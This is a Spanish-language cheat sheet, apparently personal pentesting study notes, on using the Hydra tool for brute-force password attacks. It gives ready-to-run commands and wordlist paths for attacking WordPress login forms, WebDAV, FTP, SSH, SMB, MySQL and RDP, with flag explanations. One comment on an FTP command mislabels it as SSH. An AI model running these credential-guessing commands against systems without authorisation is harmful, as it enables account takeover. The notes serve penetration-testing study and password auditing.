# Hydra 

Tags: #Hydra 

Es una herramienta de prueba de penetración que se utiliza para realizar ataques de fuerza bruta, por así decirlo, en servicios de autenticación remotos. Esta herramientas nos ayuda a poder encontrar passwd mediante ataques furtivos. 

- Soporte de múltiples protocolos: Hydra es compatible con una amplia gama de protocolos de autenticación incluyendo: SSH, Telnet, FTP, HTTP, POP3, SMB, etc...
* Fuerza bruta avanzada: Hydra es capas de realizar ataques de fuerza bruta avanzados, incluyendo ataques de diccionario y ataques basados en patrones. 
	* Podemos usar los diccionarios que ya viene en Parrot o Kali Linux (rockyou.txt)
* Modos de operación flexibles: Hydra admite diferentes modos de operación, incluyendo modo de ataque directo, modo de ataque de diccionario y modo de ataque hibrido.
* Capacidad de paralelización: Hydra es capas de realizar múltiples intentos de autenticación simultáneamente, lo que mejora la velocidad y la eficiencia del ataque. 

- Casos de uso:
	- Pruebas de penetración 
	- Auditoria de passwd
	- Recuperación de passwd

```bash 
# Directorio 
/usr/share/wordlists/rockyou.txt

# Directorios 'passwords'
/usr/share/metasploit-framework/data/wordlists/unix-passwords.txt
/usr/share/wordlists/metasploit/common_passwords.txt

# Directorios 'Users'
/usr/share/metasploit-framework/data/wordlists/unix_users.txt
/usr/share/wordlists/metasploit/common_users.txt
```

## Hydra fuerza bruta WordPress

Esto se usa en el panel del admin de WordPress.
```python
❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt http://IP http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302' 
❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt http://IP http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid user'
❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt http://IP http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"

# Haremos un ataque de fuerza bruta a WordPress (Todo lo anterior lo obtenemos de la misma página web en 'form action=/login.php') y colocamos todas la etiquetas 

	# l (ele) = Usuario de login
	# P = Ruta del diccionario
	# log y pwd = Lo podemos encontrar en el apartado de la pagina web 'Ctrl + u' 
	# S = Redireccionamiento con el codigo 302
	# F = Error que nos muestre el panel de autenticacion, por si no sirve con el 'S'
```

## Hydra fuerza bruta WebDAV

```python 
❯ hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt ❮IP❯ http-get /webdav/

	# webdav = Directorio de autenticacion 
	# L = Indicas un archivo que disponga de usuarios para login
	# P = Ruta del diccionario o 'archivo que contiene passwds'
```

## Hydra fuerza bruta FTP
```python
❯ hydra -l omar -P /usr/share/wordlists/rockyou.txt ftp://❮IP❯ -t 15 # Haremos un ataque de fuerza bruta al puerto SSH, antes de completar el comando con soble TAB podemos ver la lista de diccionarios

❯ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ❮IP❯ ftp -t 4

	# l (ele) = Usuario de login
	# L = Indicas un archivo que disponga de usuarios 
	# P = Ruta del diccionario o 'archivo que contiene passwds'
	# t = Lanzar tareas en paralelo al mismo tiempo
```

## Hydra fuerza bruta SSH

```python
❯ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://❮IP❯ -t 4
# Haremos un ataque de fuerza bruta al puerto SSH

	# ssh = Puerto al que vamos a atacar 22
	# IP = Direccion de la maquina victima
	# P = Ruta del diccionario o 'archivo que contiene passwds'
	# L = Ruta del diccionario o 'archivo que contiene users' para login
	# t = Lanzar tareas en paralelo al mismo tiempo
```

```python
❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ❮IP❯ ssh
❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://❮IP❯ -t 15 -V -s 2222 # Haremos un ataque de fuerza bruta al puerto SSH, antes de completar el comando con soble TAB podemos ver la lista de diccionarios

	# ssh = Puerto al que vamos a atacar 22
	# IP = Direccion de la maquina victima
	# P = Ruta del diccionario o 'archivo que contiene passwds'
	# l (ele) = Usuario login que en este caso es  'root'
	# t = Lanzar tareas en paralelo al mismo tiempo
	# V = Verbosity
	# s = Port y es el puerto al que nos queremos conectar 
```

## Hydra fuerza bruta SMB / SAMBA
```python 
❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://<IP>        # Fuerza bruta al usuario en el servidor SMB
❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> smb

❯ hydra -L user.list -P password.list smb://<IP>        # Para ver si esos usuarios y passwd son validos en un servidor SMB

	# L = Ruta o archivo que contiene los usuarios para login
	# P = Ruta o archivo que contiene las passwd
	# l = Un usuario en especifico para login 
```

## Hydra fuerza bruta MYSQL

```python
❯ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <IP> mysql

	# P = Ruta o archivo que contiene las passwd
	# l = Un usuario en especifico para login 
```

## Hydra fuerza bruta RDP

```python 
# Brute force para encontrar usuarios y sus passwd en RDP
❯ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<IP> -s 3333           

	# L = Ruta o archivo que contiene los usuarios para login 
	# P = Ruta o archivo que contiene las passwd
	# s = Especificas el puerto, si no lo haces Hydra asumira que es el puerto 3389
```



